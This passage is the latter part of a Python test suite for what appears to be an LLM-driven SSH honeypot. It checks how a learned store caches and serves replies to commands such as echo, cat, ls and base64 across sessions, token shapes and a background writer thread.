    for sid, ip in [("k1", "192.0.2.1"), ("k2", "198.51.100.2"), ("k3", "192.0.2.3")]:
        await _session(wired, sid, ip, [f"echo {word} > /tmp/f", "cat /tmp/f | base64 -d"])
    out, _, _ = await _session(wired, "k4", "198.51.100.9", [f"echo {word} > /tmp/f",
                                                             "cat /tmp/f | base64 -d"])
    assert out[1].reply_step == "model"
    entry = next(e for e in wired.store.entries() if e["command"].startswith("cat /tmp/f"))
    assert all(h["varying"] for h in entry["hist"].values())


def _script_obs(store, script, reply, sessions):
    for i, net in sessions:
        store.record(FP, "root", True, "mystery", None, session=f"{script}-{i}", net=net,
                     history=None, script=script, script_sent=reply)


NETS = [(0, "192.0.2.0/24"), (1, "198.51.100.0/24"), (2, "192.0.2.0/24")]


def test_varying_is_per_history_for_the_same_history_rule(store):
    a, b = learned.digest("a"), learned.digest("b")
    _script_obs(store, a, "x\r\n", NETS)
    _script_obs(store, b, "y\r\n", NETS)
    _script_obs(store, b, "z\r\n", [(9, "192.0.2.0/24")])
    assert store.lookup(FP, "root", True, "mystery", clean=False, script=a).reply == "x\r\n"
    assert store.lookup(FP, "root", True, "mystery", clean=False, script=b) is None
    assert store.lookup(FP, "root", True, "mystery") is None     # no different-histories evidence


def test_a_script_line_reaches_its_threshold_past_other_histories(store):
    target = learned.digest("target")
    _script_obs(store, target, "x\r\n", NETS[:1])
    for n in range(learned.MAX_HISTORIES + 4):     # one session each: never enough
        _script_obs(store, learned.digest("other", str(n)), "x\r\n", [(n, "192.0.2.0/24")])
    _script_obs(store, target, "x\r\n", NETS[1:])
    assert store.lookup(FP, "root", True, "mystery", clean=False, script=target) is not None
    assert len(store.entries()[0]["hist"]) <= learned.MAX_PENDING


def test_script_digest_ignores_token_values_but_not_their_reuse():
    h1, h2 = hexrun(70), hexrun(71)
    root = learned.digest("root")
    a = learned.script_step(root, f"echo {h1}", f"{h1}\r\n", (h1,))
    b = learned.script_step(root, f"echo {h2}", f"{h2}\r\n", (h2,))
    assert a == b
    c = learned.script_step(root, f"echo {h1}", "other\r\n", (h1,))
    assert a != c


def test_written_file_stays_within_the_write_budget(tmp_path, monkeypatch):
    monkeypatch.setattr(learned, "WRITE_BUDGET", 4000)
    store = LearnedStore(str(tmp_path / learned.FILE_NAME))
    promote(store, "keep-me", "k\r\n")
    for i in range(40):
        observe(store, f"filler-{i}", "f" * 200, session="x", net="192.0.2.0/24",
                history="a" * 16)
    assert os.path.getsize(tmp_path / learned.FILE_NAME) <= 4000
    assert "keep-me" in {e["command"] for e in store.entries()}


# ---- the worker thread --------------------------------------------------------------------

def test_a_slow_file_never_delays_lookup(tmp_path, monkeypatch):
    import time as _time

    path = str(tmp_path / learned.FILE_NAME)
    sync = LearnedStore(path)
    promote(sync, "mystery", "out\r\n")
    store = LearnedStore(path, background=True)
    store.preload()
    store.flush()
    real = LearnedStore._write
    monkeypatch.setattr(LearnedStore, "_write",
                        lambda self, d, e: (_time.sleep(0.5), real(self, d, e)))
    started = _time.perf_counter()
    store.record(FP, "root", True, "other", "x\r\n", session="s", net="192.0.2.0/24",
                 history="a" * 16)
    found = store.lookup(FP, "root", True, "mystery")
    assert _time.perf_counter() - started < 0.1 and found.reply == "out\r\n"
    store.close()
    assert "other" in {e["command"] for e in LearnedStore(path).entries()}


async def test_a_slow_file_never_delays_the_reply_path(wired, monkeypatch):
    import time as _time

    await _teach(wired)
    real = LearnedStore._write
    monkeypatch.setattr(LearnedStore, "_write",
                        lambda self, d, e: (_time.sleep(0.5), real(self, d, e)))
    sid, ip = "slow1", "198.51.100.50"
    assert hooks.session_open(sid, ip) is None
    cfg = {"configurable": {"session_id": sid}}
    started = _time.perf_counter()
    for line in ["", "unknown-a", "unknown-b", "mystery"]:
        await hooks.persona_invoke(wired.history, session_id=sid, src_ip=ip, username="root",
                                   text=line, interactive=True, llm_config=cfg,
                                   counts_as_command=bool(line))
    assert _time.perf_counter() - started < 0.4     # two model writes queued, not waited on
    hooks.session_close(sid)
    wired.store.flush()


def test_a_full_queue_drops_and_counts(tmp_path, monkeypatch, caplog):
    import threading as _threading

    gate = _threading.Event()
    real = LearnedStore._write
    monkeypatch.setattr(LearnedStore, "_write",
                        lambda self, d, e: (gate.wait(5), real(self, d, e)))
    store = LearnedStore(str(tmp_path / learned.FILE_NAME), background=True, queue_size=1)
    results = [store.record(FP, "root", True, f"c{i}", "x\r\n", session="s",
                            net="192.0.2.0/24", history="a" * 16) for i in range(6)]
    assert store.dropped >= 3 and results.count(None) == store.dropped
    assert "queue full" in caplog.text
    gate.set()
    store.close()
    assert len(store.entries()) == 6 - store.dropped


def test_served_counts_queue_one_flush_at_a_time(tmp_path, monkeypatch):
    import threading as _threading

    path = str(tmp_path / learned.FILE_NAME)
    promote(LearnedStore(path), "mystery", "out\r\n")
    gate = _threading.Event()
    real = LearnedStore._write
    monkeypatch.setattr(LearnedStore, "_write",
                        lambda self, d, e: (gate.wait(5), real(self, d, e)))
    store = LearnedStore(path, background=True, queue_size=4)
    eid = store_id(LearnedStore(path))
    for _ in range(100):
        store.served(eid)
    assert store._queue.qsize() <= 1 and store.dropped == 0
    gate.set()
    store.close()
    assert LearnedStore(path).entries()[0]["served"] == 100


def test_value_sets_are_kept_past_the_observation_cap(store):
    h1 = hexrun(80)
    for i in range(learned.MAX_OBSERVATIONS):
        observe(store, f"file /tmp/{h1}", f"/tmp/{h1}\r\n", session=f"s{i}",
                net=f"192.0.{i % 2}.0/24" if i % 2 else "198.51.100.0/24", history=f"{i:016x}")
    h2 = hexrun(81)
    observe(store, f"file /tmp/{h2}", f"/tmp/{h2}\r\n", session="late",
            net="192.0.2.0/24", history="f" * 16)
    assert store.lookup(FP, "root", True, f"file /tmp/{hexrun(82)}") is not None


# ---- follow-up 3: token bindings and token shapes ---------------------------------------------

class _FileHistory(_History):
    """A host with files: ``echo X > /tmp/Y`` writes, ``cat /tmp/Y`` reads, from the
    session's own history (served lines included)."""

    async def ainvoke(self, payload, config=None):
        text = payload["messages"][-1].content
        sid = config["configurable"]["session_id"]
        files = {}
        for m in self.get_session_history(sid).messages:
            words = str(m.content).split()
            if len(words) == 4 and words[0] == "echo" and words[2] == ">":
                files[words[3]] = words[1]
        if text.startswith("cat "):
            name = text.split()[1]
            self.replies[text] = (files[name] if name in files else
                                  f"cat: {name}: No such file or directory") + "\r\n" + PROMPT
        return await super().ainvoke(payload, config)


async def test_a_script_reply_needs_the_same_token_bindings(wired):
    wired.history = _FileHistory({"": PROMPT})
    for n, (sid, ip) in enumerate([("b1", "192.0.2.1"), ("b2", "198.51.100.2"),
                                   ("b3", "192.0.2.3")]):
        t = hexrun(90 + n)
        await _session(wired, sid, ip, [f"echo {t} > /tmp/{t}", f"cat /tmp/{t}"])
    a, b = hexrun(95), hexrun(96)
    out, _, _ = await _session(wired, "b4", "198.51.100.9", [f"echo {a} > /tmp/{a}",
                                                             f"cat /tmp/{b}"])
    assert a not in out[1].content
    assert out[1].content == f"cat: /tmp/{b}: No such file or directory\r\n" + PROMPT
    out, _, _ = await _session(wired, "b5", "198.51.100.10", [f"echo {a} > /tmp/{a}",
                                                              f"cat /tmp/{a}"])
    assert out[1].reply_step == "learned" and out[1].content == f"{a}\r\n" + PROMPT


async def test_a_clock_value_kept_in_a_file_ends_the_script_rule(wired):
    stamp, read = "date +%F > /tmp/stamp", "cat /tmp/stamp"
    wired.history = _History({"": PROMPT, stamp: PROMPT, read: "first-day\r\n" + PROMPT})
    for sid, ip in (("v1", "192.0.2.1"), ("v2", "198.51.100.2"), ("v3", "192.0.2.3")):
        await _session(wired, sid, ip, [stamp, read])
    out, _, _ = await _session(wired, "v4", "198.51.100.9", [stamp, read])
    assert getattr(out[1], "reply_step", None) != "learned"


def test_a_reply_for_one_token_length_never_stands_for_another(store):
    for n, (net, hist) in enumerate([("192.0.2.0/24", learned.START),
                                     ("198.51.100.0/24", learned.START),
                                     ("192.0.2.0/24", learned.START)]):
        observe(store, f"printf %s {hexrun(100 + n)} | wc -c", "20\r\n", session=f"w{n}",
                net=net, history=hist)
        observe(store, f"ls -d /tmp/{hexrun(110 + n)}", "x\r\n", session=f"w{n}", net=net,
                history=hist)
    longer = hexrun(120, 30)
    assert store.lookup(FP, "root", True, f"printf %s {longer} | wc -c",
                        history=learned.START) is None
    assert store.lookup(FP, "root", True, f"ls -d /tmp/{longer}", history=learned.START) is None
    assert store.lookup(FP, "root", True, f"ls -d /tmp/{hexrun(121)}",
                        history=learned.START) is not None


def test_computing_commands_are_learned_only_for_their_exact_text(store):
    h = hexrun(130)
    assert learned.computes(f"printf %s {h} | wc -c") and learned.computes("echo ${#x}")
    assert not learned.computes(f"ls -d /tmp/{h}") and not learned.computes("cat /etc/issue")
    promote_values(store, "echo {t} | base64", "x\r\n", (131, 132, 133))
    assert store.lookup(FP, "root", True, f"echo {hexrun(134)} | base64") is None


def test_token_shape_is_part_of_the_key():
    assert learned.shape(("ab12" * 5, "1" * 16, "AB12" * 5, "aB12" * 5,
                          "123e4567-e89b-42d3-a456-4266141740ab")) == "20x,16d,20y,20h,36u"
    h20, h30 = hexrun(140), hexrun(141, 30)
    assert learned.entry_id(FP, "root", True, "x \x000\x00", learned.shape((h20,))) != \
        learned.entry_id(FP, "root", True, "x \x000\x00", learned.shape((h30,)))
    digits = "1234567890123456"
    assert learned.shape((digits,)) != learned.shape((hexrun(142, 16),))


def test_a_repeated_token_and_two_tokens_are_different_keys():
    a, b = hexrun(150), hexrun(151)
    one = learned.command_template(f"cp {a} {a}")
    two = learned.command_template(f"cp {a} {b}")
    assert one.text != two.text
    root = learned.digest("root")
    assert learned.script_key(root, f"cat /tmp/{a}", (a,)) != \
        learned.script_key(root, f"cat /tmp/{b}", (a, b))


async def test_a_script_reply_for_one_token_length_never_stands_for_another(wired):
    wired.history = _FileHistory({"": PROMPT})
    for n, (sid, ip) in enumerate([("L1", "192.0.2.1"), ("L2", "198.51.100.2"),
                                   ("L3", "192.0.2.3")]):
        t = hexrun(160 + n)
        await _session(wired, sid, ip, [f"echo {t} > /tmp/{t}", f"cat /tmp/{t}"])
    longer = hexrun(170, 30)
    out, _, _ = await _session(wired, "L4", "198.51.100.9", [f"echo {longer} > /tmp/{longer}",
                                                             f"cat /tmp/{longer}"])
    assert out[1].reply_step == "model"


async def test_a_token_listed_among_other_names_is_never_served(wired):
    """Where a token sorts among fixed names follows its value: refused."""
    wired.history.replies.update({"": PROMPT})
    for n, (sid, ip) in enumerate([("S1", "192.0.2.1"), ("S2", "198.51.100.2"),
                                   ("S3", "192.0.2.3")]):
        t = "0" + hexrun(180 + n)[1:]           # every teacher's token sorts first
        wired.history.replies[f"touch /tmp/{t}"] = PROMPT
        wired.history.replies["ls /tmp"] = f"{t}  zzfixed\r\n" + PROMPT
        await _session(wired, sid, ip, [f"touch /tmp/{t}", "ls /tmp"])
    late = "f" + hexrun(190)[1:]                 # sorts after the fixed name
    wired.history.replies[f"touch /tmp/{late}"] = PROMPT
    out, _, _ = await _session(wired, "S4", "198.51.100.9", [f"touch /tmp/{late}", "ls /tmp"])
    assert out[1].reply_step == "model"
    entry = next(e for e in wired.store.entries() if e["command"] == "ls /tmp")
    assert all(h["varying"] for h in entry["hist"].values())


def test_pattern_matching_commands_compute():
    for line in ["case x in [0-9]*) echo n;; esac", "[[ $x =~ ^a ]] && echo y",
                 "ls /tmp/*", "echo ?"]:
        assert learned.computes(line)
